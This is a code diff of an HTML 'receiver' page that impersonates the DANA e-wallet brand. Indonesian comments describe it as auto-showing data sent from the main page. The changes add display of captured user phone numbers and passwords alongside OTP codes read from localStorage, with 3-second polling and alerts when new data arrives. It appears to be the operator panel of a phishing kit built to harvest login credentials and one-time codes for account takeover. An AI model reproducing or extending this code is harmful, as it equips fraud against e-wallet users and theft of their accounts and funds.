@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Receiver OTP - DANA</title>
+    <title>DANA Receiver - OTP</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -25,57 +26,83 @@
             max-width: 420px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            animation: fadeUp 0.5s ease;
         }
-        .logo {
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo-dana {
             text-align: center;
             margin-bottom: 24px;
         }
-        .logo .brand {
-            font-size: 28px;
-            font-weight: 700;
-            color: #0080ff;
-        }
-        .logo .brand span { color: #fff; }
-        .logo .sub {
-            color: #6a6a8a;
-            font-size: 13px;
-        }
-
-        .badge-status {
-            background: #0080ff;
-            color: #fff;
-            padding: 4px 16px;
-            border-radius: 60px;
-            font-size: 12px;
-            font-weight: 600;
+        .logo-dana .icon-wrapper {
             display: inline-block;
+            background: linear-gradient(135deg, #0080ff, #0055cc);
+            width: 60px;
+            height: 60px;
+            border-radius: 16px;
+            line-height: 60px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0, 128, 255, 0.2);
+            margin-bottom: 10px;
+        }
+        .logo-dana .icon-wrapper i { font-size: 32px; color: #fff; }
+        .logo-dana .brand {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -1px;
+            color: #fff;
+        }
+        .logo-dana .brand .d { color: #0080ff; }
+        .logo-dana .brand .a { color: #0080ff; }
+        .logo-dana .brand .n { color: #0080ff; }
+        .logo-dana .brand .a2 { color: #0080ff; }
+        .logo-dana .sub {
+            color: #6a6a8a;
+            font-size: 12px;
+            letter-spacing: 2px;
+        }
+        .badge-live {
+            display: inline-block;
+            background: #00aa44;
+            color: #fff;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 2px 14px;
+            border-radius: 60px;
+            margin-top: 4px;
         }
 
-        .otp-box {
+        .data-box {
             background: #0a0a1a;
             border: 2px solid #2a2a4e;
             border-radius: 16px;
-            padding: 20px;
-            text-align: center;
-            margin: 16px 0;
+            padding: 16px;
+            margin-top: 12px;
         }
-        .otp-box .label {
+        .data-box .label {
             color: #6a6a8a;
             font-size: 12px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        .otp-box .value {
-            font-size: 36px;
-            font-weight: 700;
+        .data-box .value {
             color: #00ff44;
             font-family: monospace;
-            letter-spacing: 6px;
-            margin: 8px 0;
+            font-size: 18px;
+            font-weight: 700;
+            word-break: break-all;
+            margin: 4px 0;
         }
-        .otp-box .phone {
-            color: #8a8aaa;
-            font-size: 14px;
+        .data-box .value.password {
+            color: #ffcc00;
+        }
+        .data-box .value.otp {
+            color: #00ff44;
+            font-size: 28px;
+            letter-spacing: 4px;
         }
 
         .info-row {
@@ -86,9 +113,7 @@
             color: #c0c0e0;
             font-size: 14px;
         }
-        .info-row:last-child {
-            border-bottom: none;
-        }
+        .info-row:last-child { border-bottom: none; }
         .info-row .label { color: #6a6a8a; }
         .info-row .value { color: #fff; font-weight: 500; }
 
@@ -101,6 +126,8 @@
             width: 100%;
             transition: 0.3s;
             font-size: 14px;
+            font-weight: 500;
+            margin-top: 12px;
         }
         .btn-refresh:hover {
             border-color: #0080ff;
@@ -115,22 +142,26 @@
             border-top: 1px solid #1a1a2e;
             padding-top: 16px;
         }
-        .footer-text strong { color: #0080ff; }
+        .footer-text .brand-small { color: #0080ff; font-weight: 700; }
 
         .empty-state {
             text-align: center;
             color: #4a4a6a;
-            padding: 30px 0;
+            padding: 20px 0;
         }
-        .empty-state i {
-            font-size: 48px;
-            color: #2a2a4e;
-            margin-bottom: 12px;
+        .empty-state i { font-size: 40px; color: #2a2a4e; margin-bottom: 8px; }
+        .empty-state h5 { color: #8a8aaa; font-weight: 500; }
+
+        .status-badge {
+            display: inline-block;
+            padding: 2px 14px;
+            border-radius: 60px;
+            font-size: 12px;
+            font-weight: 600;
         }
-        .empty-state h5 {
-            color: #8a8aaa;
-            font-weight: 500;
-        }
+        .status-badge.pending { background: #ff8800; color: #000; }
+        .status-badge.otp_sent { background: #0080ff; color: #fff; }
+        .status-badge.verified { background: #00aa44; color: #fff; }
 
         .toast-container {
             position: fixed;
@@ -145,6 +176,7 @@
             font-size: 14px;
             box-shadow: 0 8px 32px rgba(0,0,0,0.3);
             display: none;
+            font-family: 'Inter', sans-serif;
         }
     </style>
 </head>
@@ -152,23 +184,29 @@
 
 <div class="card-receiver">
 
-    <div class="logo">
-        <div class="brand">D<span>A</span>N<span>A</span></div>
+    <!-- LOGO -->
+    <div class="logo-dana">
+        <div class="icon-wrapper"><i class="bi bi-wallet2"></i></div>
+        <div class="brand"><span class="d">D</span><span class="a">A</span><span class="n">N</span><span class="a2">A</span></div>
         <div class="sub">Receiver OTP System</div>
-        <div class="badge-status" style="margin-top:8px;"><i class="bi bi-dot"></i> Live</div>
+        <div class="badge-live"><i class="bi bi-dot"></i> Live</div>
     </div>
 
-    <!-- ===== OTP DATA ===== -->
-    <div id="otpContent">
-        <!-- Dynamic content from JavaScript -->
+    <!-- ===== DATA MASUK ===== -->
+    <div id="dataContent">
+        <div class="empty-state">
+            <i class="bi bi-inbox"></i>
+            <h5>Menunggu Data...</h5>
+            <p style="font-size:13px;color:#4a4a6a;">Tunggu user mengirim data dari halaman utama</p>
+        </div>
     </div>
 
-    <button class="btn-refresh" onclick="loadOtp()">
+    <button class="btn-refresh" onclick="loadData()">
         <i class="bi bi-arrow-clockwise"></i> Refresh Data
     </button>
 
     <div class="footer-text">
-        &copy; 2026 <strong>DANA</strong> — OTP Receiver
+        &copy; 2026 <span class="brand-small">DANA</span> — OTP Receiver
     </div>
 </div>
 
@@ -177,63 +215,91 @@
 
 <script>
     // ============================================================
-    // RECEIVER — TAMPILKAN OTP DARI LOCALSTORAGE
+    // RECEIVER.HTML — AUTO TAMPIL DATA DARI INDEX
     // ============================================================
 
-    function loadOtp() {
-        const container = document.getElementById('otpContent');
-        const data = localStorage.getItem('dana_otp_data');
+    function loadData() {
+        const container = document.getElementById('dataContent');
 
-        if (!data) {
+        const userDataRaw = localStorage.getItem('dana_user_data');
+        const otpDataRaw = localStorage.getItem('dana_otp_data');
+
+        let userData = null;
+        let otpData = null;
+
+        try {
+            if (userDataRaw) userData = JSON.parse(userDataRaw);
+            if (otpDataRaw) otpData = JSON.parse(otpDataRaw);
+        } catch(e) {}
+
+        // ===== KALO BELUM ADA DATA =====
+        if (!userData && !otpData) {
             container.innerHTML = `
                 <div class="empty-state">
                     <i class="bi bi-inbox"></i>
-                    <h5>Belum ada OTP masuk</h5>
-                    <p style="font-size:13px;color:#4a4a6a;">Tunggu user mengirim OTP dari halaman utama</p>
+                    <h5>Belum ada data masuk</h5>
+                    <p style="font-size:13px;color:#4a4a6a;">Tunggu user mengirim dari halaman utama</p>
                 </div>
             `;
             return;
         }
 
-        try {
-            const parsed = JSON.parse(data);
-            const phone = parsed.phone || '-';
-            const otp = parsed.otp || '------';
-            const timestamp = parsed.timestamp ? new Date(parsed.timestamp).toLocaleString('id-ID') : '-';
-            const status = parsed.status || 'pending';
+        // ===== PRIORITAS: TAMPILKAN USER DATA (NOMOR + PASSWORD) =====
+        let html = '';
 
-            container.innerHTML = `
-                <div class="otp-box">
-                    <div class="label">KODE OTP MASUK</div>
-                    <div class="value">${otp}</div>
-                    <div class="phone">📱 ${phone}</div>
-                </div>
+        // === USER DATA (Nomor + Password) ===
+        if (userData) {
+            const statusClass = userData.status === 'pending' ? 'pending' :
+                               userData.status === 'otp_sent' ? 'otp_sent' : 'verified';
+            const statusLabel = userData.status === 'pending' ? 'Menunggu OTP' :
+                               userData.status === 'otp_sent' ? 'OTP Terkirim' : 'Selesai';
 
-                <div class="info-row">
-                    <span class="label">Status</span>
-                    <span class="value" style="color:#00ff44;">${status === 'pending' ? 'Menunggu Verifikasi' : 'Sudah Diverifikasi'}</span>
-                </div>
-                <div class="info-row">
-                    <span class="label">Dikirim</span>
-                    <span class="value">${timestamp}</span>
-                </div>
-                <div class="info-row">
-                    <span class="label">User Agent</span>
-                    <span class="value" style="font-size:11px;color:#6a6a8a;">${navigator.userAgent.substring(0, 50)}...</span>
-                </div>
-            `;
-
-            showToast('✅ Data OTP berhasil dimuat');
-
-        } catch(e) {
-            container.innerHTML = `
-                <div class="empty-state">
-                    <i class="bi bi-exclamation-triangle" style="color:#ff8800;"></i>
-                    <h5>Data rusak</h5>
-                    <p style="font-size:13px;color:#4a4a6a;">Silakan refresh atau kirim ulang OTP</p>
+            html += `
+                <div class="data-box">
+                    <div class="label"><i class="bi bi-person"></i> DATA USER</div>
+                    <div class="value">📱 ${userData.phone || '-'}</div>
+                    <div class="value password">🔒 ${userData.password || '-'}</div>
+                    <div style="margin-top:6px;">
+                        <span class="status-badge ${statusClass}">${statusLabel}</span>
+                        <span style="color:#4a4a6a;font-size:11px;margin-left:8px;">${new Date(userData.timestamp).toLocaleTimeString('id-ID')}</span>
+                    </div>
                 </div>
             `;
         }
+
+        // === OTP DATA ===
+        if (otpData) {
+            html += `
+                <div class="data-box" style="border-color:#0080ff;">
+                    <div class="label"><i class="bi bi-shield-check"></i> KODE OTP</div>
+                    <div class="value otp">${otpData.otp || '------'}</div>
+                    <div style="font-size:13px;color:#6a6a8a;margin-top:4px;">
+                        📱 ${otpData.phone || '-'}
+                        <span style="margin-left:12px;color:#4a4a6a;">${new Date(otpData.timestamp).toLocaleTimeString('id-ID')}</span>
+                    </div>
+                </div>
+            `;
+        }
+
+        // === STATUS RINGKASAN ===
+        const status = otpData ? 'OTP Terkirim' : 'Menunggu OTP';
+        html += `
+            <div style="margin-top:12px;padding:10px 14px;background:#0a0a1a;border-radius:12px;border:1px solid #1a1a2e;">
+                <div class="info-row">
+                    <span class="label">Status</span>
+                    <span class="value" style="color:${otpData ? '#00ff44' : '#ff8800'};">${status}</span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Terakhir Update</span>
+                    <span class="value">${new Date().toLocaleString('id-ID')}</span>
+                </div>
+            </div>
+        `;
+
+        container.innerHTML = html;
+
+        // === TOAST ===
+        showToast('✅ Data berhasil dimuat');
     }
 
     // ===== TOAST =====
@@ -246,20 +312,20 @@
         }, 3000);
     }
 
-    // ===== AUTO REFRESH =====
-    loadOtp();
+    // ===== AUTO LOAD =====
+    loadData();
 
-    // Refresh setiap 5 detik
-    setInterval(loadOtp, 5000);
+    // Refresh setiap 3 detik
+    setInterval(loadData, 3000);
 
     // ===== LISTENER LOCALSTORAGE (cross-tab) =====
     window.addEventListener('storage', function(e) {
-        if (e.key === 'dana_otp_data') {
-            loadOtp();
-            showToast('📩 OTP baru masuk!');
+        if (e.key === 'dana_user_data' || e.key === 'dana_otp_data') {
+            loadData();
+            showToast('📩 Data baru masuk!');
         }
     });
 </script>
 
 </body>
-</html>
+    </html>
